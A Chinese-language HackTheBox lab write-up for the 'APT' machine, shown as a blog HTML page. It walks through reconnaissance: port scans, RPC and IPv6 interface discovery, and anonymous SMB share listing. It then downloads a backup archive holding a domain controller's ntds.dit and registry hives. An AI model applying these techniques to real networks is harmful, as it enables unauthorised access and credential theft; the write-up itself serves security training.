@@ -1,0 +1,738 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:12345678910111213141516171819$ sudo nmap -sC -sV -Pn -p- -oA APT.nmap.txt 10.10.10.213[sudo] mosaic 的密码：Starting Nmap 7.92SVN ( https:&#x2F;&#x2F;google.com ) at 2022-05-26 17:55 CSTStats: 0:01:10 elapsed">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-APT">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-APT/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Recon:12345678910111213141516171819$ sudo nmap -sC -sV -Pn -p- -oA APT.nmap.txt 10.10.10.213[sudo] mosaic 的密码：Starting Nmap 7.92SVN ( https:&#x2F;&#x2F;google.com ) at 2022-05-26 17:55 CSTStats: 0:01:10 elapsed">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-10-06T11:30:34.877Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:27.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>HackTheBox-APT - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-APT"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          18k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          153 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-APT</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nmap -sC -sV -Pn -p- -oA APT.nmap.txt 10.10.10.213<br>[sudo] mosaic 的密码：<br>Starting Nmap 7.92SVN ( https://google.com ) at 2022-05-26 17:55 CST<br>Stats: 0:01:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 9.35% <span class="hljs-keyword">done</span>; ETC: 18:08 (0:11:18 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.213<br>Host is up (0.19s latency).<br>Not shown: 65533 filtered tcp ports (no-response)<br>PORT    STATE SERVICE VERSION<br>80/tcp  open  http    Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: Gigantic Hosting | Home<br>135/tcp open  msrpc   Microsoft Windows RPC<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 311.80 seconds<br></code></pre></td></tr></table></figure>
+
+<p>令人费解，我重新扫了几遍，结果都一一样，作为一台活动目录主机，只有两个端口有点太过于不同寻常。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ whatweb http://10.10.10.213<br>http://10.10.10.213 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sales@gigantichosting.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.213], JQuery, Microsoft-IIS[10.0], Script[application/x-javascript,text/javascript], Title[Gigantic Hosting | Home]<br></code></pre></td></tr></table></figure>
+
+<h4 id="80port"><a href="#80port" class="headerlink" title="80port:"></a>80port:</h4><p>80端口的信息很随意，他们看起来作者在构建是滥用了CV，或许这些信息都无关紧要。找了一圈只发现了这个看起来像是用户名</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">W3layouts<br></code></pre></td></tr></table></figure>
+
+<p>目录也并没有什么信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dirsearch -u http://10.10.10.213     <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/mosaic/.dirsearch/reports/10.10.10.213/_22-05-26_18-12-23.txt<br><br>Error Log: /home/mosaic/.dirsearch/logs/errors-22-05-26_18-12-23.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.213/<br><br>[18:12:24] Starting: <br>[18:12:28] 403 -  312B  - /%2e%2e//google.com<br>[18:12:28] 301 -  146B  - /js  -&gt;  http://10.10.10.213/js/<br>[18:12:44] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[18:12:45] 200 -    9KB - /about.html<br>[18:13:09] 301 -  147B  - /css  -&gt;  http://10.10.10.213/css/<br>[18:13:15] 301 -  149B  - /fonts  -&gt;  http://10.10.10.213/fonts/<br>[18:13:18] 301 -  150B  - /images  -&gt;  http://10.10.10.213/images/<br>[18:13:18] 403 -    1KB - /images/<br>[18:13:18] 200 -   15KB - /index.html<br>[18:13:20] 403 -    1KB - /js/<br>[18:13:29] 200 -    5KB - /news.html<br>[18:13:45] 200 -    6KB - /support.html<br></code></pre></td></tr></table></figure>
+
+<p>我试着把整个站点爬了下来：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wget -m 10.10.10.213<br></code></pre></td></tr></table></figure>
+
+<p>什么都没获取到，元属性也不包含任何信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ exiftool services.html <br>ExifTool Version Number         : 12.41<br>File Name                       : services.html<br>Directory                       : .<br>File Size                       : 10 KiB<br>File Modification Date/Time     : 2019:12:23 19:30:22+08:00<br>File Access Date/Time           : 2022:05:26 18:19:08+08:00<br>File Inode Change Date/Time     : 2022:05:26 18:19:08+08:00<br>File Permissions                : -rw-r--r--<br>File Type                       : TXT<br>File Type Extension             : txt<br>MIME Type                       : text/plain<br>MIME Encoding                   : us-ascii<br>Newlines                        : Unix LF<br>Line Count                      : 243<br>Word Count                      : 870<br></code></pre></td></tr></table></figure>
+
+<h4 id="RPC"><a href="#RPC" class="headerlink" title="RPC:"></a>RPC:</h4><p>通过rpcmap的帮助事例可以枚举到一些UUID：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ rpcmap.py <span class="hljs-string">&#x27;ncacn_ip_tcp:10.10.10.213&#x27;</span><br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 00000136-0000-0000-C000-000000000046 v0.0<br><br>Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 000001A0-0000-0000-C000-000000000046 v0.0<br><br>Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0<br><br>Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0<br><br>Protocol: [MS-RPCE]: Remote Management Interface<br>Provider: rpcrt4.dll<br>UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0<br>Opnum 0: rpc_x_bad_stub_data<br>Opnum 1: rpc_x_bad_stub_data<br>Opnum 2: rpc_x_bad_stub_data<br>Opnum 3: success<br>Opnum 4: rpc_x_bad_stub_data<br>Opnum 5: success<br><br>Protocol: [MS-RPCE]: Remote Management Interface<br>Provider: rpcrt4.dll<br>UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0<br>Opnum 0: success<br>Opnum 1: rpc_x_bad_stub_data<br>Opnum 2: success<br>Opnum 3: success<br>Opnum 4: rpc_x_bad_stub_data<br>Opnum 5: nca_s_op_rng_error (opnum not found)<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0<br>Opnum 0: rpc_fault_cant_perform<br>Opnum 1: rpc_fault_cant_perform<br>Opnum 2: rpc_x_bad_stub_data<br>Opnum 3: rpc_x_bad_stub_data<br>Opnum 4: rpc_x_bad_stub_data<br>Opnum 5: rpc_fault_cant_perform<br></code></pre></td></tr></table></figure>
+
+<p>其他都是访问失败，就这三个有些特殊。在github上会有一个根据RPC枚举网络接口的POC：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mubix/</span>IOXIDResolver.git<br></code></pre></td></tr></table></figure>
+
+<p>它只有一个帮助菜单：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ IOXIDResolver.py -h<br>IOXIDResolver.py -t &lt;target&gt;<br>$ IOXIDResolver.py -t 10.10.10.213<br>[*] Retrieving network interface of 10.10.10.213<br>Address: apt<br>Address: 10.10.10.213<br>Address: dead:beef::b885:d62a:d679:573f<br>Address: dead:beef::8c6b:eefa:c3ea:9d75<br>Address: dead:beef::236<br></code></pre></td></tr></table></figure>
+
+<p>就这样我获取到了目标的网络信息，是两个IPV6的地址。两个都可以ping通，可以随便挑一个地址扫：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ping dead:beef::8c6b:eefa:c3ea:9d75<br>PING dead:beef::8c6b:eefa:c3ea:9d75(dead:beef::8c6b:eefa:c3ea:9d75) 56 data bytes<br>64 bytes from dead:beef::8c6b:eefa:c3ea:9d75: icmp_seq=1 ttl=63 time=244 ms<br>64 bytes from dead:beef::8c6b:eefa:c3ea:9d75: icmp_seq=2 ttl=63 time=203 ms<br>64 bytes from dead:beef::8c6b:eefa:c3ea:9d75: icmp_seq=3 ttl=63 time=289 ms<br>64 bytes from dead:beef::8c6b:eefa:c3ea:9d75: icmp_seq=4 ttl=63 time=725 ms<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Thu May 26 20:32:49 2022 as: nmap -6 -sC -sV -Pn -p- -oA APT.nmap.txt dead:beef::b885:d62a:d679:573f</span><br>Nmap scan report <span class="hljs-keyword">for</span> dead:beef::b885:d62a:d679:573f<br>Host is up (0.42s latency).<br>Not shown: 65512 filtered tcp ports (no-response)<br>PORT      STATE SERVICE      VERSION<br>53/tcp    open  domain       Simple DNS Plus<br>80/tcp    open  http         Microsoft IIS httpd 10.0<br>|_http-title: Bad Request<br>| http-server-header: <br>|   Microsoft-HTTPAPI/2.0<br>|_  Microsoft-IIS/10.0<br>88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-05-26 12:56:12Z)<br>135/tcp   open  msrpc        Microsoft Windows RPC<br>389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-26T12:57:45+00:00; -1s from scanner time.<br>| ssl-cert: Subject: commonName=apt.htb.local<br>| Subject Alternative Name: DNS:apt.htb.local<br>| Not valid before: 2020-09-24T07:07:18<br>|_Not valid after:  2050-09-24T07:17:18<br>445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-26T12:57:44+00:00; 0s from scanner time.<br>| ssl-cert: Subject: commonName=apt.htb.local<br>| Subject Alternative Name: DNS:apt.htb.local<br>| Not valid before: 2020-09-24T07:07:18<br>|_Not valid after:  2050-09-24T07:17:18<br>3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=apt.htb.local<br>| Subject Alternative Name: DNS:apt.htb.local<br>| Not valid before: 2020-09-24T07:07:18<br>|_Not valid after:  2050-09-24T07:17:18<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-26T12:57:45+00:00; -1s from scanner time.<br>3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=apt.htb.local<br>| Subject Alternative Name: DNS:apt.htb.local<br>| Not valid before: 2020-09-24T07:07:18<br>|_Not valid after:  2050-09-24T07:17:18<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-26T12:57:44+00:00; -1s from scanner time.<br>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Bad Request<br>9389/tcp  open  mc-nmf       .NET Message Framing<br>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Bad Request<br>49664/tcp open  msrpc        Microsoft Windows RPC<br>49665/tcp open  msrpc        Microsoft Windows RPC<br>49666/tcp open  msrpc        Microsoft Windows RPC<br>49667/tcp open  msrpc        Microsoft Windows RPC<br>49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br>49670/tcp open  msrpc        Microsoft Windows RPC<br>49675/tcp open  msrpc        Microsoft Windows RPC<br>49695/tcp open  msrpc        Microsoft Windows RPC<br>59465/tcp open  msrpc        Microsoft Windows RPC<br>Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb-security-mode: <br>|   account_used: &lt;blank&gt;<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: required<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-05-26T12:57:20<br>|_  start_date: 2022-05-26T03:24:56<br>|_clock-skew: mean: -8m35s, deviation: 22m39s, median: -1s<br>| smb-os-discovery: <br>|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br>|   Computer name: apt<br>|   NetBIOS computer name: APT\x00<br>|   Domain name: htb.local<br>|   Forest name: htb.local<br>|   FQDN: apt.htb.local<br>|_  System time: 2022-05-26T13:57:16+01:00<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/<br><span class="hljs-comment"># Nmap done at Thu May 26 20:57:53 2022 -- 1 IP address (1 host up) scanned in 1504.15 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>这次返回了一个域该有的端口。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb dead:beef::b885:d62a:d679:573f --shares -u <span class="hljs-string">&quot;&quot;</span> -p <span class="hljs-string">&quot;&quot;</span><br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)<br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\: STATUS_ACCESS_DENIED <br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] Enumerated shares<br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              Share           Permissions     Remark<br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              -----           -----------     ------<br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              backup          READ            <br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              IPC$                            Remote IPC<br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              NETLOGON                        Logon server share <br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL                          Logon server share <br></code></pre></td></tr></table></figure>
+
+<p>SMB允许匿名访问：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient.py -target-ip apt backup<br><span class="hljs-comment"># shares</span><br>backup<br>IPC$<br>NETLOGON<br>SYSVOL<br><span class="hljs-comment"># use backup</span><br><span class="hljs-comment"># ls</span><br>drw-rw-rw-          0  Thu Sep 24 15:31:03 2020 .<br>drw-rw-rw-          0  Thu Sep 24 15:31:03 2020 ..<br>-rw-rw-rw-   10650961  Thu Sep 24 15:31:03 2020 backup.zip<br><span class="hljs-comment"># get backup.zip</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ unzip backup.zip <br>Archive:  backup.zip<br>   creating: Active Directory/<br>[backup.zip] Active Directory/ntds.dit password: <br>   skipping: Active Directory/ntds.dit  incorrect password<br>   skipping: Active Directory/ntds.jfm  incorrect password<br>   creating: registry/<br>   skipping: registry/SECURITY       incorrect password<br>   skipping: registry/SYSTEM         incorrect password<br><br></code></pre></td></tr></table></figure>
+
